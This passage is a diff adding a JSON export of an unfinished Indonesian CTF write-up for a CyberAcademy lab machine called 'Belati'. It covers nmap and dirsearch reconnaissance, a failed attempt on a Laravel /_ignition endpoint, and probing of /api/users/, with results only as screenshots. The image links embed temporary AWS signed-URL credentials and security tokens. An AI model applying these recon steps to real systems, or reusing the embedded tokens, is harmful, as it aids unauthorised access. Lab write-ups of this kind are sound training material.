@@ -1,0 +1,1979 @@
+{
+  "meta": {
+    "generated_at": "2025-09-18T01:37:34.346Z",
+    "notion_api_version": "2022-06-28",
+    "includes_content": true,
+    "folder": "ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f",
+    "slug": "ctf-cyberacademy-belati-kasar",
+    "og_image": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-1.png",
+    "featured_image": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-1.png"
+  },
+  "post": {
+    "id": "266db469-a81d-8058-ae73-c71c8b850c3f",
+    "created_time": "2025-09-06T10:11:00.000Z",
+    "last_edited_time": "2025-09-07T11:30:00.000Z",
+    "url": "https://www.notion.so/CTF-CyberAcademy-Belati-KASAR-266db469a81d8058ae73c71c8b850c3f",
+    "public_url": null,
+    "archived": false,
+    "icon": null,
+    "cover": null,
+    "properties": {
+      "description": "",
+      "createdtime": {
+        "id": "Abyx",
+        "type": "created_time",
+        "created_time": "2025-09-06T10:11:00.000Z"
+      },
+      "slug": "ctf-cyberacademy---belati-[kasar]",
+      "publisheddate": null,
+      "owner": [],
+      "featured_image": [],
+      "tags": [],
+      "published": false,
+      "title": "CTF CyberAcademy - Belati [KASAR]"
+    },
+    "title": "CTF CyberAcademy - Belati [KASAR]",
+    "content": [
+      {
+        "id": "266db469-a81d-81d3-952e-f26a726b9aaf",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Tampilan awal:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-812d-babd-f96204f1c297",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-1.png",
+          "expiry_time": "2025-09-18T02:37:20.942Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-1.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/79883246-5f5c-4128-87b2-b944eb7850e9/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013720Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=61664251a5157fd2d0926215dae627be3893bf0d71fe2b3105fa05b559d9f124&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-81a8-a74e-d0772ce87cd2",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81f8-9423-ea9cdfa08d38",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Saya coba cek nmap dulu, berikut hasilnya",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8159-845c-e2b215b65f34",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-2.png",
+          "expiry_time": "2025-09-18T02:37:20.942Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-2.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/1aabbbdf-4a2a-4354-b4ee-5002d7194dc4/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013720Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=57a18ce231223978a0e756be8d98c5e63aa430b189637f238c0c35e0fdf73c48&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-81f2-bc01-f4360115859a",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Tidak banyak port yang terbuka.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-812b-8a84-d9efdd685cc9",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8118-a7ee-ca30e4f2b413",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Coba dirsearch",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-819a-b1a7-c2391b10b93c",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-3.png",
+          "expiry_time": "2025-09-18T02:37:20.920Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-3.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/e5bd6a4a-6ac4-4833-805b-76f43c596b7d/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013720Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=55d519afa143462b18b2796cc1c9b51340c7f0cb81d6088cb35bcd306cfb2c9a&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-81dc-9ff7-c90c41da0fd2",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81e8-959a-d4fa4153fdc9",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "ada /_ignition. coba di cek, tapi gagal tidak bisa di exploit:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81a2-bf92-fe891959518a",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-4.png",
+          "expiry_time": "2025-09-18T02:37:20.922Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-4.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/7021d8d1-488e-4850-8458-13e622318229/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013720Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=f07e2ca5b01a0f316fc7db02c781f8a1799b48caf31023f2c653f8c1eb89a930&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-81bb-8ca6-c04ae54aa300",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8184-9f92-f881c69e362a",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "lalu saya cek /api, ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81ca-8847-f868aa0dcc83",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-5.png",
+          "expiry_time": "2025-09-18T02:37:20.938Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-5.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/ff05810e-4408-4d6b-9dbe-9ef0947b41cc/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013720Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=20318ab32e1f90bcd75d4a72f2f7674ced31a8d546b4d7fb426b3b2a8f84e5b4&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-817a-977b-ea4fd72fc4b9",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8156-92ba-d4a3950d48d4",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "saya cek dirsearch lagi:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8128-bf3e-f7fbd09f6720",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-6.png",
+          "expiry_time": "2025-09-18T02:37:20.917Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-6.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/c7ff3257-8e09-4fde-b4de-94803f1ddc98/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013720Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=3376da4afabeed48c47b3fad433d8ffc57551f0ed6d6d0cb08d35cd070590f35&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-81e8-9a38-eec13151fe1c",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8158-8a47-d4d03c7a4c18",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "ada /api/users/, saya coba akses",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-812d-b068-c9bf932356fb",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-7.png",
+          "expiry_time": "2025-09-18T02:37:20.917Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-7.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/e67b9c9e-0bfa-43b2-86d1-272421deed71/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013720Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3